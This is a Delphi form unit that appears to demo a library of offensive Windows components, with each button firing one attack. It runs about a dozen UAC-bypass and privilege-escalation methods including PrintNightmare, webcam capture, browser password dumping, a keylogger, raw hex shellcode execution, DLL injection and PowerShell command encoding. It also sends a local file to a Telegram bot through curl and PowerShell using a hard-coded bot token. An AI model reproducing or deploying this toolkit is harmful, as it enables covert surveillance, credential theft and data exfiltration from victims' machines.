unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls, sPageControl, 
  sGroupBox;

uses
  PrivUpPE, PrivUpDLL, WebCam, SSH, PassView, Keylogger, ShellExIn, InjectDLL,
  PowershellBase64Encode, EncodeDecodeXOR, EncodeDecodeDES,
  EncodeDecodeXEBI, EncodeDecodeSymmetric, EncodeDecodeBase64, BSSIDLocation,
  Telegram;  

type
  TForm1 = class(TForm)
    PrivUpPE1: TPrivUpPE;
    PrivUpDLL1: TPrivUpDLL;
    SSH1: TSSH;
    PassView1: TPassView;
    Keylogger1: TKeylogger;
    ShellExIn1: TShellExIn;
    InjectDLL1: TInjectDLL;
    PowershellBase64Encode1: TPowershellBase64Encode;
    EncodeDecodeXEBI1: TEncodeDecodeXEBI;
    EncodeDecodeDES1: TEncodeDecodeDES;
    EncodeDecodeXOR1: TEncodeDecodeXOR;
    EncodeDecodeSymmetric1: TEncodeDecodeSymmetric;
    EncodeDecodeBase641: TEncodeDecodeBase64;
    BSSIDLocation1: TBSSIDLocation;
    WebCam1: TWebCam;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet8: TTabSheet;
    TabSheet9: TTabSheet;
    TabSheet10: TTabSheet;
    sGroupBox4: TsGroupBox;
    Button15: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    ComboBox1: TComboBox;
    sGroupBox1: TsGroupBox;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    sGroupBox2: TsGroupBox;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Button11: TButton;
    Button12: TButton;
    Button13: TButton;
    Button14: TButton;
    sGroupBox3: TsGroupBox;
    Button22: TButton;
    sGroupBox5: TsGroupBox;
    Memo2: TMemo;
    Memo3: TMemo;
    Button20: TButton;
    Button21: TButton;
    sGroupBox6: TsGroupBox;
    Button19: TButton;
    Memo1: TMemo;
    sGroupBox7: TsGroupBox;
    Button26: TButton;
    sGroupBox8: TsGroupBox;
    sGroupBox9: TsGroupBox;
    sGroupBox10: TsGroupBox;
    sGroupBox11: TsGroupBox;
    Button27: TButton;
    Button28: TButton;
    Button29: TButton;
    Button30: TButton;
    sGroupBox12: TsGroupBox;
    sGroupBox13: TsGroupBox;
    sGroupBox14: TsGroupBox;
    Button23: TButton;
    Button24: TButton;
    sGroupBox15: TsGroupBox;
    Button25: TButton;
    Edit1: TEdit;
    Button31: TButton;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    Panel1: TPanel;
    TabSheet11: TTabSheet;
    sGroupBox16: TsGroupBox;
    Button32: TButton;
    Telegram1: TTelegram;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Button23Click(Sender: TObject);
    procedure Button24Click(Sender: TObject);
    procedure Button25Click(Sender: TObject);
    procedure Button26Click(Sender: TObject);
    procedure Button27Click(Sender: TObject);
    procedure Button28Click(Sender: TObject);
    procedure Button29Click(Sender: TObject);
    procedure Button30Click(Sender: TObject);
    procedure Button31Click(Sender: TObject);
    procedure Button32Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

////////////////////////////////////////////////////////
////////////////////////////BYPASS UAC//////////////////
////////////////////////////////////////////////////////

procedure TForm1.Button1Click(Sender: TObject);
begin
PrivUpPE1.FileName := 'cmd.exe /k whoami';
PrivUpPE1.Method := PrivUpPE.TMethodEx.CMSTP;
PrivUpPE1.Execute;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
PrivUpPE1.FileName := 'cmd.exe /k whoami';
PrivUpPE1.Method := PrivUpPE.TMethodEx.ComputerDefaults;
PrivUpPE1.Execute;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
PrivUpPE1.FileName := 'cmd.exe /k whoami';
PrivUpPE1.Method := PrivUpPE.TMethodEx.SDCLT;
PrivUpPE1.Execute;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
PrivUpPE1.FileName := 'cmd.exe /k whoami';
PrivUpPE1.Method := PrivUpPE.TMethodEx.SilentCleanup;
PrivUpPE1.Execute;
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.GPEDIT;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.PrintNightmare;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.PRINTUI;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.Netplwiz;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.Fsquirt;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button10Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.Wsreset;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button11Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.Djoin;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button12Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.OptionalFeatures;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button13Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.Fodhelper;
PrivUpDLL1.Execute;
end;

procedure TForm1.Button14Click(Sender: TObject);
begin
PrivUpDLL1.DLLName := 'C:\Users\Public\Project1.dll';
PrivUpDLL1.Method := PrivUpDLL.TMethodEx.SystemPropertiesAdvanced;
PrivUpDLL1.Execute;
end;

////////////////////////////////////////////////////////
////////////////////////////WEBCAM//////////////////////
////////////////////////////////////////////////////////
var
  HR: HResult;

procedure TForm1.Button15Click(Sender: TObject);
begin
  WebCam1.ComboBox := ComboBox1;
  HR := WebCam1.GetDevice;
end;

procedure TForm1.Button16Click(Sender: TObject);
begin
  if HR = S_OK then
  begin
    WebCam1.Panel := Panel1;
    WebCam1.CamCreate;
  end;
end;

procedure TForm1.Button17Click(Sender: TObject);
begin
  if HR = S_OK then
  begin
    WebCam1.CamDestroy;
    Panel1.Parent := sgroupBox4;
  end;
end;

procedure TForm1.Button18Click(Sender: TObject);
begin
  WebCam1.CamScreen(ExtractFilePath(ParamStr(0))+'Screen.jpg');
end;

////////////////////////////////////////////////////////
////////////////////////////SSH/////////////////////////
////////////////////////////////////////////////////////

procedure TForm1.Button19Click(Sender: TObject);
begin
  SSH1.Memo := Memo1;
  SSH1.Server := '192.168.100.5';
  SSH1.Port := 22;
  SSH1.UserName := 'Home';
  SSH1.Password := '12345';
  SSH1.Command := 'ipconfig';
  SSH1.DirectorySave := PChar(ExtractFilePath(ParamStr(0))+'ssh.inf');
  SSH1.Execute;
end;

////////////////////////////////////////////////////////
////////////////////////////PASSVIEW////////////////////
////////////////////////////////////////////////////////

procedure TForm1.Button20Click(Sender: TObject);
begin
  PassView1.Delay := 3000;
  PassView1.Memo := Memo2;
  PassView1.Method := WebBrowserPassView;
  PassView1.Execute;
end;


procedure TForm1.Button21Click(Sender: TObject);
begin
  PassView1.Delay := 3000;
  PassView1.Memo := Memo3;
  PassView1.Method := ChromePassView;
  PassView1.Execute;
end;

////////////////////////////////////////////////////////
////////////////////////////KEYLOGGER///////////////////
////////////////////////////////////////////////////////

procedure TForm1.Button22Click(Sender: TObject);
begin
  Keylogger1.Active := True;
end;


////////////////////////////////////////////////////////
////////////////////////////SHELLCODE EXECUTE///////////
////////////////////////////////////////////////////////

procedure TForm1.Button23Click(Sender: TObject);
begin
  // WinExec("cmd.exe /k whoami /priv&&pause", 0x01);
  ShellExIn1.ShellCode := '506031C964A1300000008B400C8B7014AD96AD8B58108B533C01DA8'+
  'B527801DA8B722001DE31C941AD01D881384765745075F4817804726F634175EB81780864647265'+
  '75E28B722401DE668B0C4E498B721C01DE8B148E01DA31F6525E31FF535F31C9516878656300685'+
  '7696E4589E15153FFD231C95168657373006850726F63684578697489E1515731FF89C7FFD631F6'+
  '505E31C9516873650000682670617568726976266869202F7068686F616D682F6B2077686578652'+
  '068636D642E89E16A0151FFD7';
  ShellExIn1.Execute;
end;

////////////////////////////////////////////////////////
////////////////////////////INJECT DLL//////////////////
////////////////////////////////////////////////////////

procedure TForm1.Button24Click(Sender: TObject);
begin
  InjectDLL1.PathDLL := ExtractFilePath(ParamStr(0))+'Project1.dll';
  InjectDLL1.Process := ExtractFileName(ParamStr(0));
  InjectDLL1.Inject;
end;

////////////////////////////////////////////////////////
////////////////////////////POWERSHELL ENCODE BASE64////
////////////////////////////////////////////////////////

procedure TForm1.Button25Click(Sender: TObject);
begin
  PowershellBase64Encode1.Command := 'Start-Process cmd.exe;';
  Edit1.Text := PowershellBase64Encode1.Encode;
end;

////////////////////////////////////////////////////////
////////////////////////////XEBI ECRYPT DECRYPT/////////
////////////////////////////////////////////////////////
procedure TForm1.Button26Click(Sender: TObject);
begin
  ShowMessage(EncodeDecodeXEBI1.Encrypt('Hello','12345'));
  ShowMessage(EncodeDecodeXEBI1.Decrypt('E280BAE2809846D0A560','12345'));
end;

////////////////////////////////////////////////////////
////////////////////////////DES ECRYPT DECRYPT/////////
///////////////////////////////////////////////////////
procedure TForm1.Button27Click(Sender: TObject);
begin
  ShowMessage(EncodeDecodeDES1.Encrypt('Hello','12345'));
  ShowMessage(EncodeDecodeDES1.Decrypt('A9BA6D540D3AF6E2','12345'));
end;

////////////////////////////////////////////////////////
////////////////////////////XOR ECRYPT DECRYPT/////////
///////////////////////////////////////////////////////

procedure TForm1.Button28Click(Sender: TObject);
begin
  ShowMessage(string(EncodeDecodeXOR1.Encrypt('Hello','12345')));
  ShowMessage(string(EncodeDecodeXOR1.Decrypt('79575f585a','12345')));
end;

////////////////////////////////////////////////////////
////////////////////////////SYMMETRIC ECRYPT DECRYPT///
///////////////////////////////////////////////////////

procedure TForm1.Button29Click(Sender: TObject);
begin
  ShowMessage(EncodeDecodeSymmetric1.Encrypt('Hello','12345'));
  ShowMessage(EncodeDecodeSymmetric1.Decrypt('z ¡ ','12345'));
end;

////////////////////////////////////////////////////////
////////////////////////////BASE64 ECRYPT DECRYPT//////
///////////////////////////////////////////////////////

procedure TForm1.Button30Click(Sender: TObject);
begin
  ShowMessage(EncodeDecodeBase641.Encrypt('Hello'));
  ShowMessage(EncodeDecodeBase641.Decrypt('SGVsbG8='));
end;

////////////////////////////////////////////////////////
////////////////////////////BSSID//////////////////////
///////////////////////////////////////////////////////

procedure TForm1.Button31Click(Sender: TObject);
begin
  BSSIDLocation1.Bssid := 'ee:43:f6:d1:b6:90';

  BSSIDLocation1.Server := Google;
  Edit2.Text := BSSIDLocation1.GetLocation;

  BSSIDLocation1.Server := Yandex;
  Edit3.Text := BSSIDLocation1.GetLocation;

  BSSIDLocation1.Server := Apple;
  Edit4.Text := BSSIDLocation1.GetLocation;
end;

////////////////////////////////////////////////////////
////////////////////////////TELEGRAM////////////////////
///////////////////////////////////////////////////////

procedure TForm1.Button32Click(Sender: TObject);
begin
Telegram1.TokenBot := '5154848709:ABHGi6i7EDTvnB_SkZaaWGKYaJqPTa3A-RU';
Telegram1.IdAccount := '2860373392';
Telegram1.Text := 'Text Text';
Telegram1.Document := 'C:\Users\Home\Desktop\1.txt';

Telegram1.Method := Curl;
Telegram1.SendDocument;
Telegram1.SendMessage;

sleep(3000);

Telegram1.Method := Powershell;
Telegram1.SendDocument;
Telegram1.SendMessage;
end;

end.